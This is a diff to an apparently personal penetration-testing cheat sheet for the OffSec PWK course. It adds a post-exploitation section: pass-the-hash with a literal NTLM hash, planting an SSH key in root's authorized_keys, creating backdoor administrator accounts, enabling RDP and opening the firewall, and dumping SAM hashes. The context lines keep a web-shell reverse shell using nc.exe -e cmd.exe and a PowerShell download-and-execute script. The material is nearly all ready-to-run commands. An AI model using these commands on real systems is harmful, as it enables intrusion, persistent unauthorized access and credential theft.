@@ -10,7 +10,7 @@ Offsec PWK notes and frecuently used files.
   <li><a href="#ReverseShells">Reverse Shells</a></li>
   <li><a href="#PrivilegeEscalation">Privilege Escalation</a></li>
   <li><a href="#FileTransfers">File Transfers</a></li>
-  <li><a href="#PostExploitation">Scanning and Enumeration</a></li>
+  <li><a href="#PostExploitation">PostExploitation/a></li>
   <li><a href="#PortForwarding">Port Forwarding</a></li>
   <li><a href="#WebAttacks">Web Attacks</a></li>
   <li><a href="#LessonsLearned">Lessons Learned</a></li>
@@ -84,6 +84,13 @@ Local IP: 10.10.10.10
     set LHOST 10.10.10.10
     set LPORT 443
     run
+
+
+<h4>Windows Pash the Hash</h4>
+
+    export SMBHASH=903805A370A06846300175DD6E8654A6:4AFCBB33AC6EE45C73B37E5130F25971
+    pth-winexe -U john //1.1.1.1 cmd 
+
 
 <h4>Shellshock RCE</h4>
 
@@ -265,7 +272,7 @@ PowerShell with nc.exe or another rev shell .exe
     http://1.1.1.1/backdoor.php?cmd=%22nc.exe%20-vn%2010.10.10.10%207777%20-e%20cmd.exe%22
 
 
-<div id="Privilege Escalation"> <h3>6. Privilege Escalation</h3></div>
+<div id="PrivilegeEscalation"> <h3>6. Privilege Escalation</h3></div>
 
 
 <h4>Interactive Shells </h4>
@@ -375,7 +382,7 @@ C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
 
 <a href="https://gtfobins.github.io/#">Escaping Restricted Shells</a>
 
-<div id="File Transfers"> <h3>7. File Transfers</h3></div>
+<div id="FileTransfers"> <h3>7. File Transfers</h3></div>
 
 <h4>wget</h4>
  
@@ -415,4 +422,58 @@ Remote
     echo $webclient.DownloadFile($url,$file) >>wget.ps1
     powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 
+<div id="PostExploitation"> <h3>7. PostExploitation</h3></div>
 
+<h4>Find interesting files </h4>
+
+    dir network-secret.txt /s
+
+    find . -name "network-secret.txt"
+
+<h4>Packet Captures</h4>
+
+    windump -i 2  -w capture -n -U -s 0 src not 10.10.10.10 and dst not 10.10.10.10
+
+    tcpdump -w capture -n -U -s 0 src not 10.10.10.10 and dst not 10.10.10.10
+
+Maintain Access 
+
+<h4>Add Keys to Autorized Keys</h4>
+
+Local machine
+
+    cat ~/.ssh/id_rsa.pub 
+
+
+Remote machine
+
+    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8q88wXf4E+dmEHH2ccGhGCgNdfgq4y9l4jthBxgGIzztnQs438/WxD+Fm2fwaya3YwLip3da6Pj2x1aH08Y8kYPgou8M+MXC1hD0z5YxZ4W7htfSb3X7a8mKRavcv8h1efyqdCwdzhJG48ZEHDQnspuv2DzwzynFDR89C0M8h5gw0X2Tj3ztl5tOhhJymPWVNHDnLFLDLUFuxC74gEz7rCurWvb1wKZ+XJfurr07ZmWId4tEdb04sabyEru/iEgUJawTbszHQA53BocY64qMcGgWze51RbfQ8ijqkKc88SkVlOxFKI3ecZp3lmeFaAuy8UO3Jx1GNO22SBmEz/v root@Kali" >> /root/.ssh/authorized_keys
+
+<h4>Linux Add Users</h4>
+
+    useradd -u 1037 -g users -d /home/rax -s /bin/bash -p $(echo 1234 | openssl passwd -1 -stdin) rax
+
+<h4>Windows Add users </h4>
+
+    net user rax Cisco123 /add && net localgroup Administrators rax /add
+
+<h4>Windows RDP</h4>
+
+    reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f 
+
+    reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
+
+    net start Termservice
+
+<h4>Windows Open FW for RDP</h4>
+
+    netsh.exe 
+    firewall 
+    add portopening TCP 3389 "Remote Desktop" 
+
+<h4>Windows Dump SAM</h4>
+
+    reg save HKLM\SAM %computername%.sam
+    reg save HKLM\SYSTEM %computername%.system
+
+    fgdump.exe
